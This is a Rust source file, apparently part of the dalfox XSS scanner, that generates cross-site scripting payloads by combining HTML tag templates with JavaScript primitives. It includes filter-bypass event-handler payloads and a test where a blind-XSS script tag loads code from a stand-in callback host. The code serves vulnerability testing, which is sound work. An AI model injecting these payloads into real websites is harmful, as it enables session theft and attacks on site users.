/// Dynamically build HTML payloads by combining base templates with JavaScript execution
/// primitives from XSS_JAVASCRIPT_PAYLOADS.
/// This replaces the previous static XSS_HTML_PAYLOADS constant to ensure automatic synchronization
/// when JavaScript payload list changes.
/// Expose useful HTML tag names commonly leveraged in XSS contexts
pub fn useful_html_tag_names() -> &'static [&'static str] {
    &[
        "script", "img", "svg", "iframe", "math", "xmp", "details", "video", "audio", "object",
        "embed", "marquee", "body", "meta", "link", "input", "form", "textarea", "select",
        "template",
    ]
}

pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
    let templates = [
        // CLASS markers (for DOM verification)
        "<IMG src=x onerror={JS} ClAss=dalfox>",
        "<sVg onload={JS} claSS=dalfox>",
        "<sCrIpt/cLaSs=dalfox>{JS}</scRipT>",
        "<xmp><p title=\"</xmp><svg/onload={JS}) class=dalfox>",
        "<details open ontoggle={JS} class=dalfox>",
        "<iFrAme/src=JaVAsCrIPt:{JS} ClAss=dalfox>",
        // ID markers (for DOM verification)
        "<IMG src=x onerror={JS} id=dalfox>",
        "<sVg onload={JS} iD=dalfox>",
        "<sCrIpt/ID=dalfox>{JS}</scRipT>",
        // Filter bypass: using / instead of space
        "<svg/onload={JS}/class=dalfox>",
        "<img/src=x/onerror={JS}/class=dalfox>",
        // Filter bypass: autofocus+onfocus patterns (trigger without user interaction)
        "<input autofocus onfocus={JS} class=dalfox>",
        "<textarea autofocus onfocus={JS} class=dalfox></textarea>",
        // Filter bypass: alternative event handlers
        "<body onload={JS} class=dalfox>",
        "<marquee onstart={JS} class=dalfox>",
        "<video autoplay onloadstart={JS} class=dalfox><source></video>",
        "<object onerror={JS} class=dalfox>",
    ];
    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
        for tmpl in templates.iter() {
            out.push(tmpl.replace("{JS}", js));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_dynamic_xss_html_payloads_non_empty() {
        let payloads = get_dynamic_xss_html_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_dynamic_xss_html_payloads_contains_markers_and_js() {
        let payloads = get_dynamic_xss_html_payloads();
        let has_class = payloads
            .iter()
            .any(|p| p.to_lowercase().contains("class=dalfox"));
        let has_id = payloads
            .iter()
            .any(|p| p.to_lowercase().contains("id=dalfox"));
        assert!(has_class || has_id, "should contain class/id dalfox marker");
        let has_alert = payloads
            .iter()
            .any(|p| p.to_lowercase().contains("alert(1)"));
        assert!(has_alert, "should include at least one alert(1) variant");
    }

    #[test]
    fn test_attribute_payloads_from_event_module() {
        let attrs = crate::payload::get_dynamic_xss_attribute_payloads();
        assert!(!attrs.is_empty(), "attribute payloads should not be empty");
        assert!(attrs.iter().any(|p| p.starts_with("onerror=")));
        assert!(attrs.iter().any(|p| p.starts_with("onload=")));
        assert!(
            attrs.iter().any(|p| p.contains("alert(1)")),
            "should include alert(1) primitive"
        );
    }

    #[test]
    fn test_blind_template_placeholder_and_replacement() {
        let tpl = crate::payload::XSS_BLIND_PAYLOADS
            .get(0)
            .copied()
            .unwrap_or("\"'><script src={}></script>");
        assert!(
            tpl.contains("{}"),
            "blind template should include '{{}}' placeholder"
        );
        let replaced = tpl.replace("{}", "https://callback.example/x");
        assert!(
            replaced.contains("https://callback.example/x"),
            "replaced template should include callback URL"
        );
    }
}
